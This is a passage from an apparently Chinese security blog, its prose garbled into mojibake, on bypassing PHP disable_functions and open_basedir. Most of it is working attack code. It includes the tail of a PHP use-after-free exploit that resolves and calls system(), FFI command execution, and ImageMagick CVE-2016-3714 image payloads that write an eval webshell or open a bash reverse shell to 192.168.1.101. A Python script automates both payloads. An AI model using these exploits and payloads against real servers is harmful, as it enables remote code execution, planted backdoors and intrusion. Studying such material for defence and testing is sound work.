&#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params">$arg</span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="0x08-FFIæ‰©å±•"><a href="#0x08-FFIæ‰©å±•" class="headerlink" title="0x08 FFIæ‰©å±•"></a>0x08 FFIæ‰©å±•</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.ffi.php">https://www.php.net/manual/zh/book.ffi.php</a></p>
</blockquote>
<p>php&gt;7.4ï¼Œå¼€å¯äº†FFIæ‰©å±•ffi.enable=trueï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡FFIæ¥è°ƒç”¨Cä¸­çš„systemè¿›è€Œè¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®çš„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ffi = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line">$ffi-&gt;system(<span class="string">&quot;whoami &gt;/tmp/1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/tmp/1&quot;</span>);</span><br><span class="line">@unlink(<span class="string">&quot;/tmp/1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ImageMagick</strong></li>
</ul>
<p>imagemagickæ˜¯ä¸€ä¸ªç”¨äºå¤„ç†å›¾ç‰‡çš„ç¨‹åºï¼Œå¦‚æœä¸Šä¼ çš„å›¾ç‰‡å«æœ‰æ”»å‡»ä»£ç ï¼Œåœ¨å¤„ç†æ—¶å¯è¢«è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼ˆCVE-2016â€“3714ï¼‰</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1">https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1</a></p>
</blockquote>
<ul>
<li>æœ¬åœ°æµ‹è¯•</li>
</ul>
<p>åœ¨å®¹å™¨ä¸­ <code>/poc.png</code> æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;evalbug.com&#x2F;&quot;|ls -la&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>

<p>æ„å»ºæ—¶å·²ç»é›†æˆåœ¨å®¹å™¨ä¸­ï¼Œå¯æ‰‹åŠ¨ä¿®æ”¹ç¬¬ 3 è¡Œçš„å‘½ä»¤ã€‚</p>
<p>åœ¨ç‰©ç†æœºä¸Šç›´æ¥æ‰§è¡Œä¸‹é¢å‘½ä»¤éªŒè¯æ¼æ´ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker exec i_imagemagick_1 convert &#x2F;poc.png 1.png</span><br></pre></td></tr></table></figure>

<p>æˆ–è¿›å…¥ dockerå®¹å™¨ shell ä¸­æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ convert &#x2F;poc.png 1.png</span><br></pre></td></tr></table></figure>

<p>å¦‚æœçœ‹åˆ° <code>ls -al</code> å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œåˆ™å­˜åœ¨æ¼æ´ã€‚</p>
<ul>
<li>è¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯•</li>
</ul>
<p>è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ï¼Œå¯é€šè¿‡å†™æ–‡ä»¶æˆ–è€…åå¼¹ shell æ¥éªŒè¯æ¼æ´å­˜åœ¨ã€‚</p>
<ol>
<li><p>å†™ä¸€å¥è¯åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;1.jpg&quot;|echo \&#39;&lt;?php eval($_POST[\&#39;ant\&#39;]);?&gt;\&#39; &gt; shell.php&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
</li>
<li><p>åå¼¹ shell:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;1.jpg&quot;|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.101&#x2F;2333 0&gt;&amp;1&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>å°†ä¸Šè¿°ä¸¤ä¸ª Exp ç»è¿‡ base64 ç¼–ç åå‘é€åˆ°è¿œç¨‹ <code>poc.php</code>ï¼Œquerystring çš„ <code>key</code> ä¸º <code>img</code>ã€‚</p>
<p>ä¹Ÿå¯ä¿®æ”¹ <code>poc.py</code> åæ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doPost</span>(<span class="params">url, data</span>):</span></span><br><span class="line">    post_data = &#123;<span class="string">&quot;img&quot;</span>: base64.b64encode(data)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url + <span class="string">&quot;/poc.php&quot;</span>, data=post_data, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™ webshell</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeshell</span>(<span class="params">url</span>):</span></span><br><span class="line">    writeshell = <span class="string">&#x27;&#x27;&#x27;push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill &#x27;url(https://example.com/1.jpg&quot;|echo \\&#x27;&lt;?php eval($_POST[\\&#x27;ant\\&#x27;]);?&gt;\\&#x27; &gt; shell.php&quot;)&#x27;</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    doPost(url, writeshell)</span><br><span class="line">    resp2 = requests.post(url + <span class="string">&quot;/shell.php&quot;</span>, data=&#123;<span class="string">&quot;ant&quot;</span>: <span class="string">&quot;echo md5(123);&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> resp2.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span> <span class="keyword">in</span> resp2.content:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;WebShell: &quot;</span> + url + <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">url</span>):</span>    </span><br><span class="line">    reverse_shell = <span class="string">&quot;&quot;&quot;push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill &#x27;url(https://example.com/1.jpg&quot;|bash -i &gt;&amp; /dev/tcp/192.168.1.101/2333 0&gt;&amp;1&quot;)&#x27;</span></span><br><span class="line"><span class="string">pop graphic-context&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åå¼¹ shell</span></span><br><span class="line">    doPost(url, reverse_shell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># å†™ webshell</span></span><br><span class="line">    writeshell(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">    <span class="comment"># åå¼¹ shell</span></span><br><span class="line">    <span class="comment"># reverse_shell(&quot;http://127.0.0.1:8000/&quot;)</span></span><br></pre></td></tr></table></figure>

<h2 id="bypass-open-basedir-ğŸ”"><a href="#bypass-open-basedir-ğŸ”" class="headerlink" title="bypass open_basedir ğŸ”"></a>bypass open_basedir ğŸ”</h2><blockquote>
<p>refer: </p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></p>
</blockquote>
<h3 id="open-basedir-å®˜æ–¹æ‰‹å†Œä¸Šçš„æè¿°"><a href="#open-basedir-å®˜æ–¹æ‰‹å†Œä¸Šçš„æè¿°" class="headerlink" title="open_basedir å®˜æ–¹æ‰‹å†Œä¸Šçš„æè¿°"></a>open_basedir å®˜æ–¹æ‰‹å†Œä¸Šçš„æè¿°</h3><p><code>open_basedir</code> <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php">string</a></p>
<p>Limit the files that can be accessed by PHP to the specified directory-tree, including the file itself. This directive is <em>NOT</em> affected by whether Safe Mode is turned On or Off.</p>
<p>When a script tries to access the filesystem, for example using <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.include.php">include</a>, or <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>, the location of the file is checked. When the file is outside the specified directory-tree, PHP will refuse to access it. All symbolic links are resolved, so itâ€™s not possible to avoid this restriction with a symlink. If the file doesnâ€™t exist then the symlink couldnâ€™t be resolved and the filename is compared to (a resolved) <strong>open_basedir</strong>.</p>
<p><strong>open_basedir</strong> can affect more than just filesystem functions; for example if <code>MySQL</code> is configured to use <code>mysqlnd</code> drivers, <code>LOAD DATA INFILE</code> will be affected by <strong>open_basedir</strong>. Much of the extended functionality of PHP uses <code>open_basedir</code> in this way.</p>
<p>The special value <code>.</code> indicates that the working directory of the script will be used as the base-directory. This is, however, a little dangerous as the working directory of the script can easily be changed with <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.chdir.php">chdir()</a>.</p>
<p>In httpd.conf, <strong>open_basedir</strong> can be turned off (e.g. for some virtual hosts) <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/configuration.changes.php#configuration.changes.apache">the same way</a> as any other configuration directive with â€œ<code>php_admin_value open_basedir none</code>â€œ.</p>
<p>Under Windows, separate the directories with a semicolon. On all other systems, separate the directories with a colon. As an Apache module, <strong>open_basedir</strong> paths from parent directories are now automatically inherited.</p>
<p>The restriction specified with <strong>open_basedir</strong> is a directory name since PHP 5.2.16 and 5.3.4. Previous versions used it as a prefix. This means that â€œ<code>open_basedir = /dir/incl</code>â€œ also allowed access to â€œ<code>/dir/include</code>â€œ and â€œ<code>/dir/incls</code>â€œ if they exist. When you want to restrict access to only the specified directory, end with a slash. For example: <code>open_basedir = /dir/incl/</code></p>
<p>The default is to allow all files to be opened.</p>
<blockquote>
<p><strong>Note</strong>:</p>
<p>As of PHP 5.3.0 open_basedir can be tightened at run-time. This means that if open_basedir is set to <code>/www/</code> in php.ini a script can tighten the configuration to <code>/www/tmp/</code> at run-time with <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ini-set.php">ini_set()</a>. When listing several directories, you can use the <strong><code>PATH_SEPARATOR</code></strong> constant as a separator regardless of the operating system.</p>
</blockquote>
<blockquote>
<p><strong>Note</strong>:</p>
<p>Using open_basedir will set <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.realpath-cache-size">realpath_cache_size</a> to <code>0</code> and thus <em>disable</em> the realpath cache.</p>
</blockquote>
<h3 id="0x01-ini-set"><a href="#0x01-ini-set" class="headerlink" title="0x01 ini_set()"></a>0x01 ini_set()</h3><p>æ­£å¦‚å®˜æ–¹æ‰‹å†Œä¸­æåˆ°,open_basedir çš„å¯ä¿®æ”¹èŒƒå›´æ˜¯<code>PHP_INI_ALL</code>ï¼Œè€Œini_setçš„ä¿®æ”¹èŒƒå›´æ˜¯<code>PHP_INI_USER</code> å’Œ <code>PHP_INI_ALL</code>,æ­¤å¤–å¦‚ä¸Šæ–‡ä¸­æåˆ°<code>The restriction specified with **open_basedir** is a directory name since PHP 5.2.16 and 5.3.4. Previous versions used it as a prefix. </code>ï¼Œåœ¨æœ¬åœ°æµ‹è¯•ä¸­ä¹Ÿå‘ç°,<code>php&lt;=php5.2.17</code>ï¼Œæ˜¯ä»¥æ£€æŸ¥å‰ç¼€çš„æ–¹å¼,è€Œå¯¹äº<code>php&gt;=php5.3.2</code>ï¼Œåˆ™æ˜¯ä»¥æ–‡ä»¶åçš„å½¢å¼è¦æ±‚åŒ¹é…ã€‚</p>
<p>ç¯å¢ƒ:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php5.2.17nts  php5.4.45nts  php5.6.9nts  php7.0.9nts.log  php7.2.9nts      php7.3.4nts  php7.4.3nts</span><br><span class="line">php5.3.29nts  php5.5.9nts   php7.0.9nts  php7.1.9nts      php7.3.9nts  </span><br></pre></td></tr></table></figure>

<p>å¤§è‡´ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;D:/&#x27;</span>));</span><br><span class="line">$file = file_get_contents(<span class="string">&#x27;D:/flag&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>($file);</span><br></pre></td></tr></table></figure>

<h3 id="0x02-åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°Bypass"><a href="#0x02-åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°Bypass" class="headerlink" title="0x02 åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°Bypass"></a>0x02 åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°Bypass</h3><blockquote>
<p>è™½ç„¶ä¸Šåˆä¸­æåˆ°<strong>open_basedir</strong> ä¼šå½±å“æ•°æ®åº“åŠ è½½æ–‡ä»¶,ä½†æ²¡æœ‰è¯´å½±å“åˆ°å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;D:/phpstudy_pro&#x27;</span>));</span><br><span class="line">var_dump(ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">var_dump(system(<span class="string">&#x27;type D:\flag&#x27;</span>));</span><br></pre></td></tr></table></figure>

